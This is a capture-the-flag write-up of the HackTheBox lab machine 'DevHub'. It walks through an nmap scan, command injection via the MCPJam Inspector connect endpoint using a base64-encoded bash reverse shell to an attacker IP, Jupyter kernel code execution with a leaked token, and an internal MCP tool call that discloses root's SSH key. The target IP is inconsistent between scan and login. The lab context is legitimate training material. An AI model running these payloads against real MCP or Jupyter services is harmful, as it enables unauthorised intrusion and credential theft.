# HackTheBox: DevHub Write-up

## Enumeration

I started with a full TCP scan against the target:

```bash
nmap -sSVC -A -p- 10.129.14.8
```

The scan revealed three exposed services:

```text
22/tcp   open  ssh   OpenSSH 8.9p1 Ubuntu 3ubuntu0.15
80/tcp   open  http  nginx 1.18.0
6274/tcp open  http  MCPJam Inspector
```

The HTTP service on port `80` redirected to:

```text
http://devhub.htb/
```

Port `6274` exposed a web interface titled:

```text
MCPJam Inspector
```

## MCPJam Inspector

Opening the service on port `6274` showed the MCPJam Inspector interface.

The application exposed functionality for connecting to MCP servers and interacting with tools.

I prepared a reverse shell payload and Base64-encoded it:

```bash
echo 'bash -i >& /dev/tcp/10.10.15.88/4444 0>&1' | base64
```

This produced:

```text
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS44OC80NDQ0IDA+JjEK
```

## Command Execution Through MCP

I used the MCP connection endpoint to configure a malicious server command.

```bash
curl -s -X POST http://devhub.htb:6274/api/mcp/connect \
-H "Content-Type: application/json" \
-d '{
  "serverConfig": {
    "command": "sh",
    "args": [
      "-c",
      "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS44OC80NDQ0IDA+JjEK | base64 -d | bash"
    ],
    "env": {}
  },
  "serverId": "pwned"
}'
```

This resulted in command execution and provided a shell as the `mcp-dev` user.

## Internal Enumeration

From the shell, I inspected running processes:

```bash
ps aux | grep -E "jupyter|opsmcp"
```

A JupyterLab instance was running locally as the `analyst` user:

```text
/home/analyst/jupyter-env/bin/python3
/home/analyst/jupyter-env/bin/jupyter-lab
```

The service was bound to:

```text
127.0.0.1:8888
```

The process command line also exposed the Jupyter authentication token.

## Jupyter Enumeration

Using the discovered token, I queried the local Jupyter API:

```bash
curl -s "http://localhost:8888/api/contents?token=<TOKEN>"
```

The API revealed notebook content under the analyst user's Jupyter environment.

One of the available notebooks was:

```text
quarterly_analysis.ipynb
```

## Jupyter Kernel Code Execution

I created a Python script that connected directly to a running Jupyter kernel using its WebSocket API.

The script performed a WebSocket upgrade against:

```text
/api/kernels/<KERNEL_ID>/channels?token=<TOKEN>
```

and then sent an `execute_request` message to the kernel.

A simplified version of the execution payload was:

```python
code = """
import os

print("=== WHOAMI ===")
print(os.popen("whoami").read().strip())
"""
```

The request was sent as a Jupyter protocol message:

```python
msg = json.dumps({
    "header": {
        "msg_id": str(uuid.uuid4()),
        "msg_type": "execute_request",
        "username": "mcp-dev",
        "session": str(uuid.uuid4()),
        "version": "5.3"
    },
    "parent_header": {},
    "metadata": {},
    "content": {
        "code": code,
        "silent": False,
        "store_history": False
    }
})
```

Executing the script:

```bash
python3 /tmp/exploit.py
```

allowed command execution through the Jupyter kernel as the `analyst` user.

## Privilege Escalation

Further enumeration exposed another internal MCP service listening on:

```text
localhost:5000
```

The service exposed a `/tools/call` endpoint protected by an API key.

I sent the following request:

```bash
curl -s -X POST "http://localhost:5000/tools/call" \
-H "Content-Type: application/json" \
-H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
-d '{
  "name": "recovery",
  "arguments": {
    "target": "ssh_keys",
    "confirm": true
  }
}'
```

The response returned an emergency recovery SSH key for the root account.

The private key was saved locally:

```bash
chmod 600 id_rsa
```

I then used it to connect over SSH:

```bash
ssh -i id_rsa root@10.129.14.38
```

This resulted in a root shell.

## Attack Path

```text
Nmap
  ↓
devhub.htb
  ↓
MCPJam Inspector on port 6274
  ↓
Malicious MCP server configuration
  ↓
Command execution as mcp-dev
  ↓
Local JupyterLab discovery
  ↓
Jupyter token and kernel enumeration
  ↓
WebSocket execute_request
  ↓
Code execution as analyst
  ↓
Internal MCP service on localhost:5000
  ↓
Authenticated /tools/call request
  ↓
Emergency recovery SSH key disclosure
  ↓
Root SSH access
```

## Notes

The user and root flag values have been intentionally removed from this public write-up.
